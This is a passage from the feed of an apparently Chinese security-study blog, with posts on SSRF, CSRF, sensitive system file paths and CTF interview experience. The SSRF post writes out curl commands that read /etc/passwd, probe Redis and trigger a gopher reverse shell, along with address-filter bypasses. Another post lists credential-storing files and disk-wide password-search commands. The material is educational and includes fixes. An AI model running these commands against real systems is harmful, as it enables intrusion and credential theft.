    <content type="html"><![CDATA[<h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>SSRF是一种由攻击者构造形成由服务端发起请求的一个安全漏洞<br>SSRF攻击的目标一般是作为跳板机访问从外网无法访问的内部系统<br>（正是因为它是由服务端发起的，所以它能够请求到内网）<br><a href="https://smms.app/image/daoBFcPQqzvXkpy" target="_blank"><img src="https://s2.loli.net/2023/07/07/daoBFcPQqzvXkpy.png" width="500" /></a></p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制<br>因此可以从指定URL地址获取网页完本内容、加载指定地址的图片、下载等。</p><h4 id="利用价值"><a href="#利用价值" class="headerlink" title="利用价值"></a>利用价值</h4><p>利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务</p><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ol><li>探测内网信息,用协议探<code>ftp%26ip=&#123;ip&#125;%26port=&#123;port&#125;</code>（dict协议）</li><li>攻击内网或本地其他服务（比如溢出）</li><li>穿透防火墙</li><li>对内网web应用进行指纹识别，通过访问应用存在的默认文件实现</li><li>利用file协议读取本地文件</li><li>利用Redis未授权访问，HTTP CRLF注入</li><li>DOS攻击（请求大文件，始终保持连接keep alive always）等等</li><li>ophergopher协议/gopher协议访问，反弹shell</li></ol><h4 id="漏洞出现点"><a href="#漏洞出现点" class="headerlink" title="漏洞出现点"></a>漏洞出现点</h4><ol><li>能够对外发起网络请求的地方</li><li>请求远程服务器资源的地方</li><li>数据库内置功能</li><li>邮件系统</li><li>文件处理</li><li>在线处理工具</li></ol><p><strong>举几个例子：</strong></p><ol><li>在线识图，在线文档翻译，分享，订阅等</li><li>根据远程URL上传，静态资源图片等</li><li>数据库的比如mongodb的copyDatabase函数</li><li>邮件系统就是接收邮件服务器地址这些地方。</li><li>文件就找ImageMagick，xml这些。</li><li>从URL关键字（source,share,link,src,imageurl,target等）</li></ol><h4 id="SSRF漏洞相关函数和类"><a href="#SSRF漏洞相关函数和类" class="headerlink" title="SSRF漏洞相关函数和类"></a>SSRF漏洞相关函数和类</h4><p>file_get_contents()将整个文件或一个url所指向的文件读入一个字符串中。<br>readfile()输出一个文件的内容。<br>fsockopen()打开一个网络连接或者一个Unix 套接字连接。<br>curl_exec()初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。<br>fopen()打开一个文件文件或者 URL。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>http协议访问<code>url=http://127.0.0.1/1.txt</code></li><li><a href="https://www.cnblogs.com/endust/p/11804767.html">PHP伪协议访问</a><a href="https://smms.app/image/IHa9JMnTCySpNWO" target="_blank"><img src="https://s2.loli.net/2023/07/07/IHa9JMnTCySpNWO.png" width="600" /></a></li><li>Gopher协议</li><li>FastCGI协议</li><li>Redis协议<br>```<h1 id="利用file协议查看文件"><a href="#利用file协议查看文件" class="headerlink" title="利用file协议查看文件"></a>利用file协议查看文件</h1>curl -v ‘<a href="http://sec.com/ssrf.php?url=file:///etc/passwd&#39;">http://sec.com/ssrf.php?url=file:///etc/passwd&#39;</a></li></ol><h1 id="利用dict探测端口"><a href="#利用dict探测端口" class="headerlink" title="利用dict探测端口"></a>利用dict探测端口</h1><p>curl -v ‘<a href="http://sec.com/ssrf.php?url=dict://127.0.0.1:6379&#39;">http://sec.com/ssrf.php?url=dict://127.0.0.1:6379&#39;</a></p><h1 id="利用gopher协议反弹shell"><a href="#利用gopher协议反弹shell" class="headerlink" title="利用gopher协议反弹shell"></a>利用gopher协议反弹shell</h1><p>curl -v ‘<a href="http://sec.com/ssrf.php?url=gopher://127.0.0.1:6379/_....&#39;">http://sec.com/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379/_....&#39;</a></p><pre><code>#### 绕过姿势1. 利用HTTP基本身份认证的方式绕过`http://example.com@127.0.0.1`2. 利用IP地址的省略写法绕过,`http://123.254.34.254&gt;&gt;http://[::123.254.34.254]`3. DNS解析 `http://127.0.0.1.xip.io/` 可以指向任意ip的域名：`xip.io`4. 利用八进制IP地址绕过,利用十六进制IP地址,绕过利用十进制的IP地址[**绕过**](https://tool.520101.com/wangluo/jinzhizhuanhuan/)5. `http://127.1/a.txt` 或者 `http://0/a.txt`6. file_get_contents()函数遇到了不认识的伪协议头 `httpsssss://` ，就会将他当做文件夹，然后再配合目录穿越即可读取文件#### 其他各种指向127.0.0.1的地址</code></pre><p><a href="http://localhost/">http://localhost/</a>         # localhost就是代指127.0.0.1<br><a href="http://0.0.0.0/">http://0/</a>                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1<br>http://[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行<br>http://[::]:80/           # 在liunx下可用，window测试了下不行<br><a href="http://127.0.0.1/">http://127。0。0。1/</a>       # 用中文句号绕过<br>http://①②⑦.⓪.⓪.①<br><a href="http://127.0.0.1/">http://127.1/</a><br><a href="http://127.0.0.1/">http://127.00000.00000.001/</a> # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1</p><p>```</p><h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>1.地址做白名单处理<br>2.域名识别IP 过滤内部IP<br>3.校验返回的内容对比是否与假定的一致</p><h4 id="CSRF、SSRF和重放攻击有什么区别？"><a href="#CSRF、SSRF和重放攻击有什么区别？" class="headerlink" title="CSRF、SSRF和重放攻击有什么区别？"></a>CSRF、SSRF和重放攻击有什么区别？</h4><ul><li>CSRF是跨站请求伪造攻击，由客户端发起</li><li>SSRF是服务器端请求伪造，由服务器发起</li><li>重放攻击是将截获的数据包进行重放，达到身份认证等目的</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h4&gt;&lt;p&gt;SSRF是一种由攻击者构造形成由服务端发起请求的一个安全漏洞&lt;br&gt;SSRF攻击的目标一般是作为跳板机访问从外网无法访问的内部系统&lt;br&gt;（</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>系统敏感文件路径汇总</title>
    <link href="https://liu1272.github.io/2023/07/07/%E7%B3%BB%E7%BB%9F%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E6%B1%87%E6%80%BB/"/>
    <id>https://liu1272.github.io/2023/07/07/%E7%B3%BB%E7%BB%9F%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E6%B1%87%E6%80%BB/</id>
    <published>2023-07-07T07:24:00.000Z</published>
    <updated>2023-07-28T13:55:24.986Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><pre><code>c:/boot.ini //查看系统版本c:/windows/php.ini //php配置信息c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码c:/winnt/php.inic:/winnt/my.inic:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码c:\Program Files\Serv-U\ServUDaemon.inic:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此c:\Program Files\RhinoSoft.com\ServUDaemon.exeC:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件//存储了pcAnywhere的登陆密码c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机d:\APACHE\Apache2\conf\httpd.confC:\Program Files\mysql\my.iniC:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码%WINDIR%%WINDIR%\system32%TEMP%%LOCALAPPDATA%%APPDATA%</code></pre><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><pre><code>/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件/usr/local/apache2/conf/httpd.conf/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置/usr/local/app/php5/lib/php.ini //PHP相关设置/etc/sysconfig/iptables //从中得到防火墙规则策略/etc/httpd/conf/httpd.conf // apache配置文件/etc/rsyncd.conf //同步程序配置文件/etc/my.cnf //mysql的配置文件/etc/redhat-release //系统版本/etc/issue/etc/issue.net/usr/local/app/php5/lib/php.ini //PHP相关设置/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看/usr/local/resin-pro-3.0.22/conf/resin.conf 同上/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看/usr/local/resin-pro-3.0.22/conf/resin.conf 同上/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看/etc/sysconfig/iptables 查看防火墙策略etc/passwd   用户信息文件etc/crontab   定时任务文件etc/anacrontab   异步定时任务文件etc/rc.d/rc.local   开机启动项var/log/btmp   登录失败日志，使用last命令查看var/log/cron   定时任务执行日志/var/log/lastlog   所有用户最近登录信息，使用lastlog查看var/log/secure   验证、授权等日志var/log/wtmp   包含用户登录日志，使用last命令查看var/log/utmp   当前登录系统的用户信息，使用last命令查看</code></pre><h4 id="文件寻找方法"><a href="#文件寻找方法" class="headerlink" title="文件寻找方法"></a>文件寻找方法</h4><pre><code>【Windows】# 全盘查找文件，一定要加一个星号！for /r c:\ %i in (password.txt*) do @echo %ifor /r c:\ %i in (*.ini) do @echo %i# 查找 C 盘中包含 password 字样的文件，一定要双引号！findstr /s /n &quot;password&quot; c:\*# 查找 pwd.txt 中是否包含 password 字样，一定要双引号！find /N /I &quot;password&quot; pwd.txt【Linux】# 查找文件find / -name filename.ext# 全盘查找含有 flag 的文件grep flag -r /</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Windows&quot;&gt;&lt;a href=&quot;#Windows&quot; class=&quot;headerlink&quot; title=&quot;Windows&quot;&gt;&lt;/a&gt;Windows&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;c:/boot.ini //查看系统版本

c:/windows/php.ini /</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>CSRF跨站点请求伪造</title>
    <link href="https://liu1272.github.io/2023/07/07/CSRF%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
    <id>https://liu1272.github.io/2023/07/07/CSRF%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</id>
    <published>2023-07-07T06:29:00.000Z</published>
    <updated>2023-07-19T07:17:14.957Z</updated>
    
    <content type="html"><![CDATA[<h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>是社工的一种，不大流行，但如果被成功利用，危害很大。</p><h4 id="XSS与CSRF区别"><a href="#XSS与CSRF区别" class="headerlink" title="XSS与CSRF区别"></a>XSS与CSRF区别</h4><p>XSS通过<code>盗取</code>网站内的已有的用户的身份，然后再执行相关操作<br>CSRF通过<code>伪装</code>用户身份，通过服务器身份认证后，然后发送恶意请求<br>虽然两者有一些区别，但是通常结合使用</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在浏览器中cookie在一段时间内是不会过期（不关闭或者退出浏览器）<br>如果在cookie存在期间，通过构造csrf脚本或包含csrf脚本的链接发送给用户<br>得到信息后，再伪造成用户身份，执行相关操作<br>攻击者盗用了受害者的身份，以受害者的名义发送恶意请求<br>对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作</p><h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><p>比如发消息、盗号、转账等没有没有需要再次验证身份的基本操作<br>再要验证身份的话，那就再社工搭建一个一模一样的网站</p><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p><strong>站外攻击：</strong><br>用户在攻击者构造的网站中触发伪造请求时，强制用户客户端就会发起请求<br><strong>站内攻击：</strong><br>如果开发人员滥用 <code>$_REQUEST</code> 类变量，以Post提交的数据表单，也支持Get传参。<br>攻击者把预测的请求参数上传到站内贴子或留言的图片链接里<br>当用户浏览了含有请求参数的页面就强制发出这些请求。</p><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ol><li>对网站管理员进行攻击</li><li>修改受害网站上的用户账户和数据</li><li>账户劫持</li><li>传播CSRF蠕虫进行大规模攻击</li><li>利用csrf进行拖库</li><li>利用其他漏洞进行组合拳攻击</li><li>针对路由器的csrf攻击</li></ol><h4 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h4><ol><li>尽量使用POST，限制GET；</li><li>浏览器Cookie策略（时间生存周期管理和签名校验管理）；</li><li>加验证码；</li><li>Referer Check；</li><li>Anti CSRF Token；</li></ol><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>更改数据包POST/GET</li><li>修改Referer</li><li>利用XSS漏洞或其他方法将代码注入目标服务器，诱使受害者触发</li><li>使用Burp右键tool里生成一个PoC</li></ol><p>好像就这么多，CSRF没啥好讲的了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h4&gt;&lt;p&gt;是社工的一种，不大流行，但如果被成功利用，危害很大。&lt;/p&gt;
&lt;h4 id=&quot;XSS与CSRF区别&quot;&gt;&lt;a href=&quot;#XSS与CSRF区</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>过去两个月干了啥？</title>
    <link href="https://liu1272.github.io/2023/07/07/%E8%BF%87%E5%8E%BB%E4%B8%A4%E4%B8%AA%E6%9C%88%E5%B9%B2%E4%BA%86%E5%95%A5%EF%BC%9F/"/>
    <id>https://liu1272.github.io/2023/07/07/%E8%BF%87%E5%8E%BB%E4%B8%A4%E4%B8%AA%E6%9C%88%E5%B9%B2%E4%BA%86%E5%95%A5%EF%BC%9F/</id>
    <published>2023-07-07T05:36:00.000Z</published>
    <updated>2023-07-07T06:18:50.516Z</updated>
    
    <content type="html"><![CDATA[<p>也没干啥正事，天天打CTF有点倦了，休息一下。</p><p>首先吐槽一下web方向的一部分题目<br>经常能遇到各种各样的脑瘫题目完全脱离现实<br>有的知识点并不实用就罢了，出题人为了出点新题还会把题目设置得脑洞要特别大才能做出来<br>你们说 <code>Misc</code> 安全杂项本来就是这样那就算了， <code>Web</code> 安全也这样真的合适吗？<br>不过幸好现在 CTF 大赛都已经往实战的方向走了。<br>然后就是区块链，上次陕西省赛的区块链给个纸条猜地址是什么鬼……</p><p>除了CTF以外，自己也挖了几个洞，差不多总结了一套渗透的方案</p><p>7月前后到处发简历，想参加一下护网、实习之类的攒攒经验<br>在面试了两三个之后，感觉身为大一还是太菜了，根本抢不过高年级的<br>我总结了一下常见的问题（可能是常见的吧）：</p><ol><li>正常的询问年龄学历，对岗位的了解</li><li><code>OWASP top10</code> 原理、预防、实践（深度看具体情况）</li><li>SQLmap之类渗透工具的使用</li><li>实战中不同情况下的处理情况（只能多实践了）</li><li>ip，同源策略，DNS等等网络相关的问题<br>如果把市面上流传的面筋背个滚瓜烂熟大概初级的岗位面试是没太大问题</li></ol><p>后面几天先把之前的笔记修补更正一下<br>回家之后再学习红蓝相关的技术吧<br>有空再学学区块链合约审计之类的</p><p>行吧，不知道说啥就这样吧<br>下次见</p><p><a href="https://smms.app/image/J5wCygPKH4mBueN" target="_blank"><img src="https://s2.loli.net/2023/07/07/J5wCygPKH4mBueN.gif" width="300" /></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;也没干啥正事，天天打CTF有点倦了，休息一下。&lt;/p&gt;
&lt;p&gt;首先吐槽一下web方向的一部分题目&lt;br&gt;经常能遇到各种各样的脑瘫题目完全脱离现实&lt;br&gt;有的知识点并不实用就罢了，出题人为了出点新题还会把题目设置得脑洞要特别大才能做出来&lt;br&gt;你们说 &lt;code&gt;Misc&lt;/</summary>
      
    
    
    
    <category term="随笔" scheme="https://liu1272.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="随笔" scheme="https://liu1272.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
</feed>
